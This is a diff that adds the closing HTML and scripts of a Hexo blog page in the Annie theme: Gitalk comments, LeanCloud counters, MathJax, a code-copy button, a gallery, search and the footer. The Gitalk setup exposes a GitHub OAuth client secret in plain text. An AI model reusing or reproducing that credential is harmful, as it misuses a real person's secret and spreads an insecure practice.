+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
